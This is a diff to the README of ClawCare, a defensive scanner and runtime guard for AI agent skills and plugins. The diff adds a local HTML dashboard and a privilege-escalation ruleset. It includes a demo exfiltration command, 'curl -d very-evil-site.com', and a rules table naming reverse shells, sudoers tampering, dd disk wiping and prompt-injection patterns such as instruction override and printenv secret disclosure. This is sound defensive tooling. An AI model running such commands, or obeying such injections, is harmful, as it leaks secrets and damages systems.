@@ -6,7 +6,7 @@
 
 ***Run AI agents with care - OpenClaw, Claude Code and more***
 
-ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, and data exfiltration. It also provides **runtime command interception** (ClawCare Guard) that blocks dangerous commands before they execute. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.
+ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, data exfiltration, privilege escalation, and prompt injection. It also provides **runtime command interception** (ClawCare Guard) that blocks dangerous commands before they execute, and a **local HTML dashboard** for full visibility into scan results and guard audit trails. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.
 
 [![OpenClaw](https://img.shields.io/badge/OpenClaw-plugin-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PC9zdmc+)](https://docs.openclaw.ai/tools/plugin)
 [![Claude Code](https://img.shields.io/badge/Claude_Code-hooks-blueviolet?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
@@ -55,6 +55,12 @@ clawcare guard activate --platform {claude|openclaw}
 
 # Then ask your agent to run an attack command such as data exfiltration via curl:
 curl -d very-evil-site.com
+```
+
+Generate dashboard:
+
+```
+clawcare dashboard
 ```
 
 
@@ -314,15 +320,39 @@ See [`clawcare/adapters/base.py`](clawcare/adapters/base.py) for the full protoc
 
 ### Built-in Rules
 
-Three rulesets ship by default, organized by attack category:
+Four rulesets ship by default, organized by attack category:
 
 | Ruleset | Catches |
 |---------|--------|
-| `execution-abuse` | Pipe-to-shell, reverse shells, credential theft, persistence, destructive commands, subprocess abuse |
-| `data-exfiltration` | Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IP addresses, env-variable exfiltration |
-| `prompt-injection` | Instruction override, role hijacking, ignore-previous-instructions patterns |
+| `execution-abuse` | Pipe-to-shell, reverse shells, base64 decode-exec, persistence (cron/systemd/LaunchAgents), destructive commands, subprocess abuse, shell eval, runtime package installs |
+| `data-exfiltration` | Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IBAN/routing numbers, IP addresses, env-variable exfiltration, `/proc/environ` access |
+| `privilege-escalation` | SUID/SGID backdoors, sudoers tampering, disk wiping via `dd`, root shell spawning, sudo permission abuse |
+| `prompt-injection` | Agent-directed env/secret disclosure, `printenv`/`export -p` instructions that leak secrets into the AI provider context |
 
-All rules include [CWE](https://cwe.mitre.org/) references where applicable. Rules are used by both the static scanner and the runtime guard.
+All rules are used by both the static scanner and the runtime guard.
+
+## Dashboard
+
+Generate a self-contained HTML dashboard that combines scan results and guard audit events in one view:
+
+```bash
+# Generate from a scan report + guard audit log
+clawcare scan . --format json --json-out scan.json
+clawcare dashboard --scan-json scan.json
+
+# Auto-detects scan.json in the current directory
+clawcare dashboard
+```
+
+The dashboard includes:
+- **Scan tab** — severity cards, sortable findings table, highlighted scan timestamp, click-to-expand detail modal
+- **Guard tab** — status summary cards, hourly activity chart, severity column, sortable events table with time range filter
+- **UTC / Local toggle** — one-click timezone conversion for all timestamps
+- Summary cards and activity chart **update dynamically** when the time range filter changes
+
+All data stays local — no external requests, no telemetry. The HTML file works offline.
+
+---
 
 ## CI Integration
 
@@ -385,6 +415,12 @@ clawcare guard report                 Query audit history
 clawcare guard hook                   (internal) Handle a platform hook event
   --platform claude|openclaw
   --stage pre|post
+
+clawcare dashboard                    Generate HTML dashboard
+  --scan-json PATH                    Path to scan JSON report (auto-detects scan.json)
+  --log-path PATH                     Guard audit JSONL path (default: ~/.clawcare/history.jsonl)
+  --out PATH                          Output HTML file (default: clawcare-dashboard.html)
+  --no-open                           Don't auto-open in browser
 ```
 
 ## Contributing
